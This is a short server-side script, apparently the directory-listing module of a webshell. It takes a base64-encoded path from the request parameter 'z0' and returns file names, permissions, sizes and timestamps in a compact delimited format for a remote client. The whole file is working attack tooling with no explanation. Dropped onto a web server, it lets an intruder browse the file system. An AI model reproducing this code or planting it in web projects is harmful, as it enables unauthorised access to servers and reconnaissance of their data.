<%

function fnGetFilePermission(fileObj) {
    var info = "";
    
    if (fileObj.isDirectory())
        info += "d"; // directory
    else if (fileObj.isFile())
        info += "r"; // regular
    else
        info += "u"; // unknown
    
    if (!java.io.File.separator.equals("\\")) {
        try {
            var posix = java.nio.file.Files.getPosixFilePermissions(fileObj.toPath());
            var posixStr = java.nio.file.attribute.PosixFilePermissions.toString(posix);
            
            return info + posixStr;
        } catch(e) {

        }
    }
    
    // Windows
    // owner
    info += fileObj.canRead() ? "r" : "-";
    info += fileObj.canWrite() ? "w" : "-";
    info += fileObj.canExecute() ? "x" : "-";
    
    // group
    info += fileObj.canRead() ? "r" : "-";
    info += fileObj.canWrite() ? "w" : "-";
    info += fileObj.canExecute() ? "x" : "-";
    
    // others
    info += fileObj.canRead() ? "r" : "-";
    info += fileObj.canWrite() ? "w" : "-";
    info += fileObj.canExecute() ? "x" : "-";
    
    return info;
}

var paramMap = request.getParameterMap();
var szDir = "";
if (paramMap.containsKey("z0")) {
    var b64Dir = paramMap.get("z0")[0];
    if (b64Dir != null && b64Dir != "") {
        szDir = new java.lang.String(java.util.Base64.getDecoder().decode(b64Dir), "UTF-8");
    }
}

if (szDir == "") {
    echo("ERROR://Directory path is empty.");
} else {
    try {
        var dirFile = new java.io.File(szDir);
        if (!dirFile.exists() || !dirFile.isDirectory()) {
            echo("ERROR://Unable to open directory");
        } else {
            var files = dirFile.listFiles();
            var aResult = [];
            var sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            
            if (files != null) {
                for (var i = 0; i < files.length; i++) {
                    var f = files[i];
                    
                    var name = f.getName();
                    var szFileName = f.isDirectory() ? ("/" + name) : name;
                    var nameBytes = new java.lang.String(szFileName).getBytes("UTF-8");

                    // encode
                    var szb64FileName = java.util.Base64.getEncoder().encodeToString(nameBytes);
                    
                    // permission
                    var szPerm = fnGetFilePermission(f);
                    
                    // bytes
                    var nLength = f.isDirectory() ? 0 : f.length();
                    
                    // timestamp
                    var mtime = sdf.format(new java.util.Date(f.lastModified()));
                    var ctime = mtime;
                    var atime = mtime;
                    
                    try {
                        var path = f.toPath();
                        var attr = java.nio.file.Files.readAttributes(path, java.nio.file.attribute.BasicFileAttributes.class);
                        ctime = sdf.format(new java.util.Date(attr.creationTime().toMillis()));
                        atime = sdf.format(new java.util.Date(attr.lastAccessTime().toMillis()));
                    } catch(err) {
                        // do something
                    }
                    
                    var szResult = szb64FileName + "?" + szPerm + "?" + nLength + "?" + ctime + "?" + mtime + "?" + atime;
                    aResult.push(szResult);
                }
            }
            
            echo(aResult.join("|"));
        }
    } catch (e) {
        echo("ERROR://" + e.message);
    }
}

%>